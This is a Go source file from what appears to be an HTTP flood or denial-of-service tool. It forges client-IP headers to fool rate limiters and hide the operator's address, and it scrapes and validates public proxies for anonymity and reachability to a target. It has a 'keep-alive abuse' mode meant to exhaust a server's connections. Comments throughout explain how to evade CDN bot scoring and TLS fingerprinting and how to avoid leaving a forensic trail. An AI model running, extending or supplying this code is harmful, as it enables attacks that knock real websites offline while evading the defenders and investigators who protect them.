package main

import (
	"crypto/tls"
	"fmt"
	"io"
	mathrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// stop scanning once we have this many verified proxies, OR once
// proxyAcquisitionBudget elapses, whichever comes first. validating every one of
// ~18k scraped proxies is pointless: a few dozen working ones saturate any run, and
// the background refresh tops the worker pool up during the run anyway. the
// goroutines that haven't started yet race a <-stop against acquiring the semaphore
// and bail the moment the channel closes, so a healthy pool finishes in seconds and
// a dead one is bounded by the time budget instead of grinding for minutes. a
// partial pool acquired fast beats a full pool acquired slowly.
//
// these are package vars (not consts) so they can be overridden from the config
// file / flags at startup; the defaults below are used when nothing overrides them.
var (
	targetGoodProxies      = 50
	proxyAcquisitionBudget = 45 * time.Second
	// proxyTestTimeout bounds each individual validation round trip (connectivity,
	// anonymity, target reachability). it's the per proxy lever on acquisition speed:
	// every proxy that's going to fail costs up to this long × the number of gates it
	// reaches, so lowering it trades a few false negatives for faster acquisition.
	// set from config.ProxyTestTimeout / -proxy-test-timeout at startup.
	proxyTestTimeout = 5 * time.Second
)

func generateRandomIP() string {
	// use public ISP-allocated blocks only. RFC 1918 private addresses
	// (10.x, 192.168.x, 172.16-31.x) in an X-Forwarded-For header sent to a
	// public server are impossible in legitimate traffic and flag immediately
	// as a bot. even unsophisticated rate limiters reject them on sight.
	blocks := [][2]int{
		{1, 0},   // APNIC
		{45, 0},  // various ISPs
		{71, 0},  // US broadband
		{75, 0},  // US broadband
		{98, 0},  // US broadband
		{173, 0}, // various
		{174, 0}, // US ISPs
		{184, 0}, // US ISPs
		{209, 0}, // various ISPs
		{213, 0}, // EU ISPs
	}
	b := blocks[mathrand.Intn(len(blocks))]
	return fmt.Sprintf("%d.%d.%d.%d", b[0], mathrand.Intn(255), mathrand.Intn(255), mathrand.Intn(254)+1)
}

// secondaryIPHeaders are additional client-IP trust headers that some misconfigured
// backends (self-hosted nginx, simple cloud load balancers) read instead of the TCP
// source IP. addAnonymizationHeaders rotates the SAME forged public IP across a random
// subset of these per request, so over a run we cover whichever header a given target
// trusts. what is deliberately NOT in this list, and why:
//   - private/loopback values (127.0.0.1, 10.x, 192.168.x): an impossible source IP in
//     real internet traffic, even crude rate limiters reject it on sight (see generateRandomIP).
//   - CF-Connecting-IP / True-Client-IP: CDN-SET headers. Cloudflare/Akamai populate them
//     and do not trust an inbound copy, sending one is a known bot fingerprint.
//   - X-Forwarded-Host / X-Host: host headers, not IP headers, a different (host-injection)
//     technique that risks breaking routing, so not folded into IP spoofing here.
var secondaryIPHeaders = []string{
	"X-Originating-IP",
	"X-Client-IP",
	"X-Cluster-Client-IP",
	"X-Remote-IP",
}

// addAnonymizationHeaders sets client-IP trust headers to a random PUBLIC IP on every
// outbound request.
//
// what this does: prevents the target application from seeing our real IP in
// its access logs via the header. also fools any rate limiter that trusts
// these headers over the TCP source IP (common on self-hosted nginx setups
// and simple cloud load balancers with trusted-proxy misconfiguration). the same
// IP is used across X-Forwarded-For, X-Real-IP, and a random subset of
// secondaryIPHeaders so the forged story stays consistent if a backend cross-checks
// them. only a subset goes out per request, a single request carrying every IP header
// at once is itself a "trying too hard" bot tell.
//
// what this does NOT do: cloudflare, akamai, aws cloudfront, and fastly all
// gate rate-limiting and bot scoring on the TCP source IP, not on XFF. they
// may log or forward the header downstream but they do not trust it for
// blocking decisions because any client can forge it. to actually change the
// IP the CDN sees, you need a real proxy, pass -proxies or -rotate-proxy.
//
// headers we intentionally do NOT add:
//
//	CF-Ray     , cloudflare sets this on responses, not requests. sending it
//	              inbound flags the request as a bot that read the CF docs.
//	CF-Visitor , same: CF response header, meaningless on inbound requests.
//	X-Amzn-Trace-Id, AWS internal tracing; sending it outbound signals
//	              "I am pretending to be an AWS internal service."
//	Via: 1.1 cloudflare, a forged forwarding chain from a non-CF IP is
//	              a known bot fingerprint in cloudflare's ruleset.
func addAnonymizationHeaders(req *http.Request) {
	fakeIP := generateRandomIP()
	// the two headers a legit forwarding proxy almost always sets, consistent IP across both.
	req.Header.Set("X-Forwarded-For", fakeIP)
	req.Header.Set("X-Real-IP", fakeIP)
	// add a random subset of the secondary trust headers (same IP) so, across a run,
	// we hit whichever one the target reads, without spraying all of them every time.
	for _, h := range secondaryIPHeaders {
		if mathrand.Float32() < 0.35 {
			req.Header.Set(h, fakeIP)
		}
	}
	if mathrand.Float32() < 0.5 {
		req.Header.Set("X-Forwarded-Proto", "https")
	}
}

// createAnonymousTransport builds a real proxied transport: traffic exits
// through proxyURL at the TCP level, so the target sees the proxy's source IP,
// not ours. this is the stdlib fallback path used when -tls-fingerprinting is
// off. it is a real proxy; the limitation is the TLS handshake, not the routing.
//
// the TLS layer here is go's stdlib crypto/tls, which emits an identifiable
// ClientHello (JA3 fingerprint). cloudflare, akamai, and aws will fingerprint
// that handshake and can block it at the TLS layer before the request lands.
// the cipher suite list below restricts what go negotiates for TLS 1.2 but does
// not change the extension list or curve preferences that dominate the JA3 hash.
// to defeat TLS fingerprinting, use -tls-fingerprinting, which routes the same
// proxy through the uTLS round tripper instead of this transport.
func createAnonymousTransport(proxyURL *url.URL) *http.Transport {
	return &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
		DialContext: (&net.Dialer{
			Timeout:   30 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 10,
		MaxConnsPerHost:     50,
		IdleConnTimeout:     30 * time.Second,
		TLSHandshakeTimeout: 10 * time.Second,
		DisableKeepAlives:   false,
		ForceAttemptHTTP2:   config.HTTP2Multiplexing,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			// restricts the TLS 1.2 cipher negotiation to these suites; does
			// not affect TLS 1.3 (go ignores the list for 1.3 per the spec).
			// this changes what ciphers are offered in TLS 1.2 ClientHellos but
			// does not disguise the go extension list, a fingerprinter can
			// still identify this as go stdlib. use -tls-fingerprinting to fix that.
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
				tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
				tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			},
		},
	}
}

// createIntelligentKeepAliveTransport creates an intelligently aggressive keep-alive transport
func createIntelligentKeepAliveTransport(config AttackConfig) *http.Transport {
	if !config.KeepAliveAbuse {
		// Standard transport when keep-alive abuse is disabled
		return &http.Transport{
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 10,
			MaxConnsPerHost:     50,
			IdleConnTimeout:     30 * time.Second,
			DisableKeepAlives:   true, // Normal behavior
			ForceAttemptHTTP2:   config.HTTP2Multiplexing,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		}
	}

	// KEEP-ALIVE ABUSE MODE
	// Randomize connection parameters to avoid detection patterns
	maxIdleConns := 150 + mathrand.Intn(100)   // 150-250
	maxIdlePerHost := 20 + mathrand.Intn(30)   // 20-50
	maxConnsPerHost := 80 + mathrand.Intn(120) // 80-200
	idleTimeout := 45 + mathrand.Intn(60)      // 45-105 seconds
	keepAliveTime := 60 + mathrand.Intn(120)   // 60-180 seconds

	return &http.Transport{
		// Aggressive connection pooling
		MaxIdleConns:        maxIdleConns,
		MaxIdleConnsPerHost: maxIdlePerHost,
		MaxConnsPerHost:     maxConnsPerHost,

		// Extended timeouts for connection exhaustion
		IdleConnTimeout:       time.Duration(idleTimeout) * time.Second,
		ResponseHeaderTimeout: 120 * time.Second, // Long response wait
		ExpectContinueTimeout: 10 * time.Second,

		// CRITICAL: Keep connections alive aggressively
		DisableKeepAlives:  false,
		DisableCompression: false, // Allow compression to seem normal
		ForceAttemptHTTP2:  config.HTTP2Multiplexing,

		// Custom dialer for connection control
		DialContext: (&net.Dialer{
			Timeout:   45 * time.Second,                           // Longer dial timeout
			KeepAlive: time.Duration(keepAliveTime) * time.Second, // Extended keep-alive
		}).DialContext,

		// TLS configuration, same caveat as createAnonymousTransport: go stdlib
		// ClientHello is identifiable by fingerprinters. use -tls-fingerprinting
		// to send a browser ClientHello instead.
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
		},

		// Advanced connection management
		TLSHandshakeTimeout: 30 * time.Second,
		WriteBufferSize:     32 * 1024, // 32KB write buffer
		ReadBufferSize:      32 * 1024, // 32KB read buffer
	}
}

// ProxySource represents a proxy source website
type IPCheckResult struct {
	Service string
	IP      string
	Error   error
}

// getRealIP gets the real IP address without any proxy
func getRealIP() (string, error) {
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
			},
		},
	}

	// Try multiple IP checking services for reliability
	services := []string{
		"https://api.ipify.org",
		"https://ipinfo.io/ip",
		"https://icanhazip.com",
		"https://checkip.amazonaws.com",
		"https://api.myip.com",
	}

	for _, service := range services {
		resp, err := client.Get(service)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			body, err := io.ReadAll(resp.Body)
			if err == nil {
				ip := strings.TrimSpace(string(body))
				// For JSON responses like myip.com, extract IP
				if strings.Contains(ip, "{") {
					// Simple JSON parsing for IP
					if strings.Contains(ip, `"ip"`) {
						parts := strings.Split(ip, `"ip":"`)
						if len(parts) > 1 {
							ip = strings.Split(parts[1], `"`)[0]
						}
					}
				}
				if isValidIP(ip) {
					return ip, nil
				}
			}
		}
	}

	return "", fmt.Errorf("failed to get real IP from any service")
}

// getProxyIP gets the IP address when using a specific proxy
func getProxyIP(proxyURL string) (string, error) {
	proxyParsed, err := url.Parse(proxyURL)
	if err != nil {
		return "", fmt.Errorf("invalid proxy URL: %v", err)
	}

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyParsed),
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   proxyTestTimeout,
	}

	// Try multiple IP checking services
	services := []string{
		"https://api.ipify.org",
		"https://ipinfo.io/ip",
		"https://icanhazip.com",
		"https://checkip.amazonaws.com",
	}

	for _, service := range services {
		resp, err := client.Get(service)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			body, err := io.ReadAll(resp.Body)
			if err != nil {
				continue
			}
			ip := strings.TrimSpace(string(body))
			if isValidIP(ip) {
				return ip, nil
			}
		}
	}

	return "", fmt.Errorf("failed to get IP through proxy")
}

// testProxyAnonymity tests if a proxy actually changes the IP address
func testProxyAnonymity(realIP, proxyURL string) (bool, string, error) {
	proxyIP, err := getProxyIP(proxyURL)
	if err != nil {
		return false, "", err
	}

	if proxyIP == realIP {
		return false, proxyIP, fmt.Errorf("SECURITY RISK: Proxy is not hiding your real IP")
	}

	return true, proxyIP, nil
}

// GetWorkingProxies tests proxies for connectivity, anonymity, and reachability at the
// actual target. the three stage filter means only proxies that pass all three checks
// end up in the live pool. pass targetURL="" to skip the target-specific stage.
func (ps *ProxyScraper) GetWorkingProxies(proxies []string, maxTest int, targetURL string) []string {
	if len(proxies) == 0 {
		return proxies
	}

	// Get real IP first for comparison
	fmt.Printf("checking your real ip address for anonymity testing...\n")
	realIP, err := getRealIP()
	if err != nil {
		fmt.Printf("[err] cannot determine real ip address: %v\n", err)
		fmt.Printf("[!] proceeding without anonymity verification — high security risk\n")
		return ps.getWorkingProxiesBasic(proxies, maxTest, targetURL)
	}

	fmt.Printf("real ip address: %s\n", realIP)

	// always shuffle before any capping so the early exit path samples randomly
	// rather than just testing whatever happened to be at the top of the file.
	mathrand.Shuffle(len(proxies), func(i, j int) {
		proxies[i], proxies[j] = proxies[j], proxies[i]
	})
	if maxTest > 0 && len(proxies) > maxTest {
		proxies = proxies[:maxTest]
	}
	testCount := len(proxies)

	fmt.Printf("testing up to %d proxies (stops early at %d verified)...\n\n", testCount, targetGoodProxies)

	// stop is closed the moment we accumulate targetGoodProxies verified proxies.
	// goroutines that haven't started yet select between acquiring the semaphore
	// and reading from stop, when stop is closed, they skip all network work
	// and return immediately, so the remaining queue drains in microseconds
	// rather than running every remaining proxy through three round-trips.
	stop := make(chan struct{})
	var stopOnce sync.Once
	closeStop := func() { stopOnce.Do(func() { close(stop) }) }
	var goodCount int32

	// time budget: close stop after proxyAcquisitionBudget even if we never reach
	// targetGoodProxies, so a mostly-dead pool can't grind for minutes. reuses the
	// exact bail-out path the count-based exit uses, queued goroutines return at once.
	budget := time.AfterFunc(proxyAcquisitionBudget, closeStop)
	defer budget.Stop()

	var workingProxies []string
	var anonymousProxies []string
	var wg sync.WaitGroup
	var mu sync.Mutex
	// 100 concurrent, each slot makes 3 round-trips (connectivity + anonymity +
	// target), but with a large list and early exit the bottleneck is network
	// latency not local CPU, so more parallelism helps significantly.
	sem := make(chan struct{}, 100)

	for i, proxy := range proxies {
		wg.Add(1)
		go func(idx int, proxyURL string) {
			defer wg.Done()

			// race between "acquire a slot" and "we already have enough".
			// closing stop is broadcast: all waiting goroutines unblock at once.
			select {
			case sem <- struct{}{}:
				defer func() { <-sem }()
			case <-stop:
				return
			}

			// Test basic connectivity first
			if ps.TestProxy(proxyURL) {
				mu.Lock()
				workingProxies = append(workingProxies, proxyURL)
				mu.Unlock()

				// Test anonymity
				isAnonymous, proxyIP, err := testProxyAnonymity(realIP, proxyURL)
				if err != nil {
					fmt.Printf("[err] [%d/%d] anonymity check failed: %s -> %v\n", idx+1, testCount, proxyURL, err)
				} else if isAnonymous {
					// third gate: does this proxy actually reach the target, or is it
					// blocked at the CDN/firewall before a single byte lands?
					if targetURL != "" && !testProxyAgainstTarget(proxyURL, targetURL) {
						if idx < 10 {
							fmt.Printf("[!] [%d/%d] blocked at target: %s\n", idx+1, testCount, proxyURL)
						}
					} else {
						mu.Lock()
						anonymousProxies = append(anonymousProxies, proxyURL)
						mu.Unlock()

						// close stop once we hit the target, all queued goroutines
						// that haven't started will bail out in the select above.
						if atomic.AddInt32(&goodCount, 1) >= int32(targetGoodProxies) {
							closeStop()
						}

						fmt.Printf("[ok] [%d/%d] anonymous+reachable: %s -> %s (hiding %s)\n",
							idx+1, testCount, proxyURL, proxyIP, realIP)
					}
				} else {
					fmt.Printf("[!] [%d/%d] not anonymous: %s -> %s (same as real ip)\n",
						idx+1, testCount, proxyURL, proxyIP)
				}
			} else {
				if idx < 5 { // Show first few failures
					fmt.Printf("[err] [%d/%d] connection failed: %s\n", idx+1, testCount, proxyURL)
				}
			}
		}(i, proxy)
	}

	wg.Wait()

	fmt.Printf("\nproxy test results:\n")
	fmt.Printf("   Working proxies: %d/%d (%.1f%% connectivity rate)\n",
		len(workingProxies), testCount, float64(len(workingProxies))/float64(testCount)*100)
	fmt.Printf("   Anonymous proxies: %d/%d (%.1f%% anonymity rate)\n",
		len(anonymousProxies), len(workingProxies),
		float64(len(anonymousProxies))/float64(len(workingProxies))*100)

	if len(anonymousProxies) == 0 {
		fmt.Printf("\n[!] security warning:\n")
		fmt.Printf("   NO ANONYMOUS PROXIES FOUND!\n")
		fmt.Printf("   Your real IP (%s) will be exposed in all requests!\n", realIP)
		fmt.Printf("   This creates a direct forensic trail to your location!\n\n")

		fmt.Printf("options:\n")
		fmt.Printf("   1. ABORT mission (recommended for security)\n")
		fmt.Printf("   2. Continue with DIRECT CONNECTION (HIGH RISK)\n")
		fmt.Printf("   3. Use your own trusted proxy/VPN setup\n\n")

		return []string{} // Return empty to force decision
	}

	fmt.Printf("\n[ok] found %d truly anonymous proxies\n", len(anonymousProxies))

	// Show sample of working anonymous proxies
	fmt.Printf("sample anonymous proxies:\n")
	for i, proxy := range anonymousProxies {
		if i >= 3 { // Show first 3
			fmt.Printf("   ... and %d more anonymous proxies\n", len(anonymousProxies)-3)
			break
		}
		proxyIP, _ := getProxyIP(proxy)
		fmt.Printf("   [ok] %s -> %s\n", proxy, proxyIP)
	}

	return anonymousProxies
}

// getWorkingProxiesBasic is the fallback when we can't determine the real IP for anonymity
// testing. it still applies the target-specific gate so we at least filter out proxies
// that are blocked at the destination, even without full anonymity verification.
func (ps *ProxyScraper) getWorkingProxiesBasic(proxies []string, maxTest int, targetURL string) []string {
	mathrand.Shuffle(len(proxies), func(i, j int) {
		proxies[i], proxies[j] = proxies[j], proxies[i]
	})
	if maxTest > 0 && len(proxies) > maxTest {
		proxies = proxies[:maxTest]
	}
	testCount := len(proxies)

	fmt.Printf("[!] testing up to %d proxies for connectivity only (stops early at %d)...\n", testCount, targetGoodProxies)

	stop := make(chan struct{})
	var stopOnce sync.Once
	closeStop := func() { stopOnce.Do(func() { close(stop) }) }
	var goodCount int32

	// same time budget as the full path bound a dead pool instead of grinding it.
	budget := time.AfterFunc(proxyAcquisitionBudget, closeStop)
	defer budget.Stop()

	var workingProxies []string
	var wg sync.WaitGroup
	var mu sync.Mutex
	sem := make(chan struct{}, 100)

	for i, proxy := range proxies {
		wg.Add(1)
		go func(idx int, proxyURL string) {
			defer wg.Done()

			select {
			case sem <- struct{}{}:
				defer func() { <-sem }()
			case <-stop:
				return
			}

			if ps.TestProxy(proxyURL) {
				if targetURL != "" && !testProxyAgainstTarget(proxyURL, targetURL) {
					if idx < 10 {
						fmt.Printf("[!] [%d/%d] blocked at target: %s\n", idx+1, testCount, proxyURL)
					}
				} else {
					mu.Lock()
					workingProxies = append(workingProxies, proxyURL)
					mu.Unlock()

					fmt.Printf("[ok] [%d/%d] working: %s\n", idx+1, testCount, proxyURL)

					if atomic.AddInt32(&goodCount, 1) >= int32(targetGoodProxies) {
						closeStop()
					}
				}
			} else {
				if idx < 10 {
					fmt.Printf("[err] [%d/%d] failed: %s\n", idx+1, testCount, proxyURL)
				}
			}
		}(i, proxy)
	}

	wg.Wait()

	fmt.Printf("[!] working proxies: %d/%d (%.1f%% success rate) — anonymity unknown\n",
		len(workingProxies), testCount, float64(len(workingProxies))/float64(testCount)*100)

	return workingProxies
}

// testProxyAgainstTarget sends a HEAD to the real target through the proxy.
// any HTTP response, even 403, 429, or 503, means the proxy got through to the server
// and that's all we need. only a connection error or timeout means the proxy is blocked
// or dead specifically for this target, not just for httpbin.
func testProxyAgainstTarget(proxyURL, targetURL string) bool {
	proxyParsed, err := url.Parse(proxyURL)
	if err != nil {
		return false
	}
	transport := &http.Transport{
		Proxy:           http.ProxyURL(proxyParsed),
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext:     (&net.Dialer{Timeout: proxyTestTimeout}).DialContext,
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   proxyTestTimeout,
		// don't follow redirects, we only care if the proxy can reach the server at all,
		// not whether the URL itself resolves to a final destination
		CheckRedirect: func(*http.Request, []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	req, err := http.NewRequest("HEAD", targetURL, nil)
	if err != nil {
		return false
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	resp.Body.Close()
	return true
}
